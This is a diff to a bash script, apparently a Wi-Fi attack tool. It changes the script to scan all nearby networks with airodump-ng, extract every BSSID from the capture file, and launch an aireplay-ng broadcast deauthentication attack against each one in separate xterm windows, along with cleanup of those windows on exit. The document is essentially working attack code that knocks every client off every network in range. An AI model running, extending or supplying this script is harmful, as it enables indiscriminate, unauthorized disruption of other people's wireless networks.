@@ -37,8 +37,10 @@ print_title_message (){
 # Exit Manage
 trap ctrl_c INT
 ctrl_c () {
-  kill -9 "$airodump_ng_xterm_PID" 2>/dev/null & 
-  kill -9 "$aireplay_ng_xterm_PID" 2>/dev/null &
+  for xterm in "${xterms_PID[@]}"; do
+    echo $xterm
+    kill -9 $xterm 1>&1 2>/dev/null
+  done
   resetInterface
 	exit 0
 }
@@ -80,27 +82,27 @@ startAttack () {
 
   working_m "Getting Networks"
 
-  bssid_list=()
-  airodump-ng $interface > temp.txt &
+  rm temp*
+  airodump-ng $interface -w temp &
   a_ng_PID=$!
   sleep 5
-  kill -9 $a_ng_PID
-  while IFS= read -r linea; do
-   # Extraemos el ESSID de la línea usando awk
-   essid=$(echo "$linea" | awk -F ' ' '{print $NF}')
-   # Añadimos el ESSID a la lista si no está vacío
-   if [ -n "$essid" ]; then
-     bssid_list+=("$essid")
-   fi
-  done < temp.txt
+  kill -9 $a_ng_PID >/dev/null && clear && ready_m "Networks Saved\n" 1>&2 2 # TODO: no verbose output
+  bssid_list=($(awk -F '[, ]' '/:/ && !/Station/ {print $1}' temp-01.csv))
+  rm temp*
 
-  echo $bssid_list
-
-#  xterm -fg red -bg black -hold -geometry 90x32 -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$essid' $interface && \
-#    echo -e '\n[${green_color}*${end_color}] Done!'" &
-#  aireplay_ng_xterm_PID=$!
-
+  pos=0
+  xterms_PID=()
+  for bssid in "${bssid_list[@]}"; do 
+    working_m $bssid
+    x=$((pos*50))
+    y=$((pos*25))
+    xterm -fg red -bg black -hold -geometry 90x32+$x+$y -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e $bssid $interface\
+      && ready_m Done! &" &
+    xterms_PID+="$! "
+    pos=$((pos+1))
+  done
 	
+    sleep 10
 }
 
 setMonitorMode () {
@@ -156,7 +158,7 @@ if [ "$(id -u)" == "0" ]; then
   checkDependencies
   setMonitorMode
   startAttack
-  resetInterface
+  ctrl_c
 else
   warning_m "Run as root"
 fi
